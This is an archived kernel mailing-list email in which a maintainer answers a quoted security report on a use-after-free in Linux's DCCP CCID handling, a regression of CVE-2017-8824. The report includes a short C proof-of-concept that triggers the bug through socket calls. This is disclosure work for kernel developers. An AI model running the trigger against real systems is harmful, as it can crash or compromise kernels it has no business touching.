Return-Path: <netdev-owner@vger.kernel.org>
X-Original-To: lists+netdev@lfdr.de
Delivered-To: lists+netdev@lfdr.de
Received: from vger.kernel.org (vger.kernel.org [23.128.96.18])
	by mail.lfdr.de (Postfix) with ESMTP id 4B24C2025AB
	for <lists+netdev@lfdr.de>; Sat, 20 Jun 2020 19:35:13 +0200 (CEST)
Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
        id S1728318AbgFTRfC (ORCPT <rfc822;lists+netdev@lfdr.de>);
        Sat, 20 Jun 2020 13:35:02 -0400
Received: from userp2120.oracle.com ([156.151.31.85]:45308 "EHLO
        userp2120.oracle.com" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
        with ESMTP id S1728126AbgFTRfC (ORCPT
        <rfc822;netdev@vger.kernel.org>); Sat, 20 Jun 2020 13:35:02 -0400
Received: from pps.filterd (userp2120.oracle.com [127.0.0.1])
        by userp2120.oracle.com (8.16.0.42/8.16.0.42) with SMTP id 05KHSxYD024836;
        Sat, 20 Jun 2020 17:34:47 GMT
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=oracle.com; h=date : from : to : cc
 : subject : message-id : references : mime-version : content-type :
 content-transfer-encoding : in-reply-to; s=corp-2020-01-29;
 bh=THUMzHGhcAFw+lNiocb/fL5eOvqzR2gXbmGaTwx31ig=;
 b=wMGEE75bU8fRLF+onMiPZgVSvAXeS/vqOIu2WBmF8fVmQU6LBCLh7kuEYdjBBdGi2VGT
 uUYhEShn40nlfF7o91RSAYbChwiUUA7ohIFNV0+G4aSXGqtga56Tv/1FTUW42pqAgmmk
 VXMuAUxwdA+ZcobGt72W08U7aca6x7XAMTA28mNhBNVyJ35kr9m7CWyFEhp4ux4IJlIm
 2VDk0VqVfyjlEDfpIxFjn8u8JG0EIvqYM1nswqZevAni1SVdycyeNxp7BvuEbAm/2Hsr
 tlFE03/Xy/ZhvK7f0UgW4DQUbKTOmNrj/W0w+/uRpZuYf/ZJwf2bEAApNPYeHHe7KgmB Iw== 
Received: from userp3020.oracle.com (userp3020.oracle.com [156.151.31.79])
        by userp2120.oracle.com with ESMTP id 31sebb992x-1
        (version=TLSv1.2 cipher=ECDHE-RSA-AES256-GCM-SHA384 bits=256 verify=FAIL);
        Sat, 20 Jun 2020 17:34:47 +0000
Received: from pps.filterd (userp3020.oracle.com [127.0.0.1])
        by userp3020.oracle.com (8.16.0.42/8.16.0.42) with SMTP id 05KHS9OK073970;
        Sat, 20 Jun 2020 17:34:47 GMT
Received: from userv0122.oracle.com (userv0122.oracle.com [156.151.31.75])
        by userp3020.oracle.com with ESMTP id 31seb6y35u-1
        (version=TLSv1.2 cipher=ECDHE-RSA-AES256-GCM-SHA384 bits=256 verify=OK);
        Sat, 20 Jun 2020 17:34:47 +0000
Received: from abhmp0001.oracle.com (abhmp0001.oracle.com [141.146.116.7])
        by userv0122.oracle.com (8.14.4/8.14.4) with ESMTP id 05KHYjUA000429;
        Sat, 20 Jun 2020 17:34:45 GMT
Received: from kadam (/41.57.98.10)
        by default (Oracle Beehive Gateway v4.0)
        with ESMTP ; Sat, 20 Jun 2020 17:34:44 +0000
Date:   Sat, 20 Jun 2020 20:34:38 +0300
From:   Dan Carpenter <dan.carpenter@oracle.com>
To:     Leonardo =?iso-8859-1?Q?Almi=F1ana?= <leonardo@alminana.com.ar>
Cc:     leonardo.alminana@tacitosecurity.com, security@kernel.org,
        netdev@vger.kernel.org
Subject: Re: DCCP Bug report
Message-ID: <20200620173438.GU4282@kadam>
References: <CANgvvt4Wi6nFJxufDFEbgW1YPwdV4wXeCgn-yu673D9oRoHJaw@mail.gmail.com>
MIME-Version: 1.0
Content-Type: text/plain; charset=iso-8859-1
Content-Disposition: inline
Content-Transfer-Encoding: 8bit
In-Reply-To: <CANgvvt4Wi6nFJxufDFEbgW1YPwdV4wXeCgn-yu673D9oRoHJaw@mail.gmail.com>
User-Agent: Mutt/1.9.4 (2018-02-28)
X-Proofpoint-Virus-Version: vendor=nai engine=6000 definitions=9658 signatures=668680
X-Proofpoint-Spam-Details: rule=notspam policy=default score=0 phishscore=0 malwarescore=0 spamscore=0
 suspectscore=0 adultscore=0 mlxscore=0 mlxlogscore=999 bulkscore=0
 classifier=spam adjust=0 reason=mlx scancount=1 engine=8.12.0-2004280000
 definitions=main-2006200130
X-Proofpoint-Virus-Version: vendor=nai engine=6000 definitions=9658 signatures=668680
X-Proofpoint-Spam-Details: rule=notspam policy=default score=0 spamscore=0 malwarescore=0 phishscore=0
 adultscore=0 impostorscore=0 cotscore=-2147483648 mlxscore=0
 suspectscore=0 mlxlogscore=999 bulkscore=0 lowpriorityscore=0
 clxscore=1011 priorityscore=1501 classifier=spam adjust=0 reason=mlx
 scancount=1 engine=8.12.0-2004280000 definitions=main-2006200130
Sender: netdev-owner@vger.kernel.org
Precedence: bulk
List-ID: <netdev.vger.kernel.org>
X-Mailing-List: netdev@vger.kernel.org

This one is already publicly known because syzbot discovered it last
November.  I have added netdev to the CC list.  Unfortunately, DCCP
seems orphaned.

https://lore.kernel.org/lkml/20191121201433.GD617@kadam/

regards,
dan carpenter

On Fri, Jun 19, 2020 at 05:59:58PM -0300, Leonardo Almiñana wrote:
> A similar bug to CVE-2017-8824 has been (RE)introduced in the Linux kernel.
> 
> When a DCCP socket connection happens one of the functions called is
> dccp_hdlr_ccid.
> 
> static int dccp_hdlr_ccid(struct sock *sk, u64 ccid, bool rx)
> {
>     struct dccp_sock *dp = dccp_sk(sk);
>     struct ccid *new_ccid = ccid_new(ccid, sk, rx);
> 
>     if (new_ccid == NULL)
>         return -ENOMEM;
> 
>     if (rx) {
>         ccid_hc_rx_delete(dp->dccps_hc_rx_ccid, sk);
>         dp->dccps_hc_rx_ccid = new_ccid;
>     } else {
>         ccid_hc_tx_delete(dp->dccps_hc_tx_ccid, sk);
>         dp->dccps_hc_tx_ccid = new_ccid;
>     }
>     return 0;
> }
> 
> The function allocates a new CCID and assigns it to the sock.
> * If an old CCID is found then it's deleted.
> 
> void ccid_hc_rx_delete(struct ccid *ccid, struct sock *sk)
> {
>     if (ccid != NULL) {
>         if (ccid->ccid_ops->ccid_hc_rx_exit != NULL)
>             ccid->ccid_ops->ccid_hc_rx_exit(sk);
>         kmem_cache_free(ccid->ccid_ops->ccid_hc_rx_slab, ccid);
>     }
> }
> 
> void ccid_hc_tx_delete(struct ccid *ccid, struct sock *sk)
> {
>     if (ccid != NULL) {
>         if (ccid->ccid_ops->ccid_hc_tx_exit != NULL)
>             ccid->ccid_ops->ccid_hc_tx_exit(sk);
>         kmem_cache_free(ccid->ccid_ops->ccid_hc_tx_slab, ccid);
>     }
> }
> 
> When the socket is disconnected dccp_disconnect is invoked, this function
> leaves dp->dccps_hc_tx_ccid unaltered.
> 
> It is possible to copy the socket including dangling references. To
> accomplish
> it the socket has to be put into LISTEN state.
> 
> struct sock *dccp_create_openreq_child(const struct sock *sk,
>                        const struct request_sock *req,
>                        const struct sk_buff *skb)
> {
>     /*
>     * Step 3: Process LISTEN state
>     *
>     * (* Generate a new socket and switch to that socket *)
>     * Set S := new socket for this port pair
>     */
> 
>     struct sock *newsk = inet_csk_clone_lock(sk, req, GFP_ATOMIC);
> 
>     [...]
> 
>     /*
>     * Activate features: initialise CCIDs, sequence windows etc.
>     */
>     if (dccp_feat_activate_values(newsk, &dreq->dreq_featneg)) {
>         sk_free_unlock_clone(newsk);
>         return NULL;
>     }
> 
>     [...]
> }
> 
> The call to inet_csk_clone_lock allocates a new socket and
> the contents of sk are copied to newsk. Next dccp_feat_activate_values gets
> called, which ends up calling dccp_hdlr_ccid.
> 
> Since the copy contains a non-NULL pointer ccid_hc_tx_delete will be called
> to
> destroy the CCID object while the source socket is still holding references
> to
> it. The UAF can be triggered by operating over the CCIDs from the original
> sock
> after the child sock has freed it.
> 
> 
> Original patch that "fixed" CVE-2017-8824:
> https://github.com/torvalds/linux/commit/69c64866ce072dea1d1e59a0d61e0f66c0dffb76
> 
> The patch was broken as it can been seen the following commit:
> https://github.com/torvalds/linux/commit/67f93df79aeefc3add4e4b31a752600f834236e2
> 
> Things were still broken, so ccid_hc_tx_delete was removed :
> https://github.com/torvalds/linux/commit/2677d20677314101293e6da0094ede7b5526d2b1
> 
> The last patch leaves things almost exactly as they were with CVE-2017-8824.
> The difference is that now only TX is affected, making exploitation harder
> for
> the following reasons:
>     - RX's size made it easy to produce kmalloc block collisions, with TX
> it isn't.
>     - The actual freeing of the object is deferred and might happen in a
> different
>       context because of RCU.
> 
> 
> Proof of Concept
> ================
> 
> #include <stdio.h>
> #include <string.h>
> #include <unistd.h>
> #include <sys/socket.h>
> #include <netinet/in.h>
> 
> 
> int main(int argc, char *argv[])
> {
>     struct sockaddr_in in1 =
>     {
>         .sin_family = AF_INET,
>         .sin_port = 0xaaaa
>     };
> 
>     struct sockaddr_in in2 =
>     {
>         .sin_family = AF_INET,
>         .sin_port = 0xbbbb
>     };
> 
>     struct sockaddr_in in3 = { 0 };
> 
>     int fd1 = socket(PF_INET, SOCK_DCCP, 0);
>     int fd2 = socket(PF_INET, SOCK_DCCP, 0);
> 
>     bind(fd1, (struct sockaddr*)&in1, sizeof(in1));
>     listen(fd1, 1);
>     connect(fd2, (struct sockaddr*)&in1, sizeof(in1));
>     connect(fd1, (struct sockaddr*)&in3, sizeof(in3));
>     connect(fd2, (struct sockaddr*)&in3, sizeof(in3));
>     bind(fd2, (struct sockaddr*)&in2, sizeof(in2));
>     listen(fd2, 1);
>     connect(fd1, (struct sockaddr*)&in2, sizeof(in2));
>     close(fd1);
>     close(fd2);
> 
>     return 0;
> }
> 
> ### ### ### ### ### ### ### ### ### ### ### ### ###
> 
> Please use my company email for any future communications, I was forced to
> use this one at the moment because your MTA refuses to accept the email
> from our provider (zoho) due to a spamcop related issue.
> 
> leonardo.alminana@tacitosecurity.com
> 
> Regards.
> 
> Leonardo Almiñana
> Tacito Security
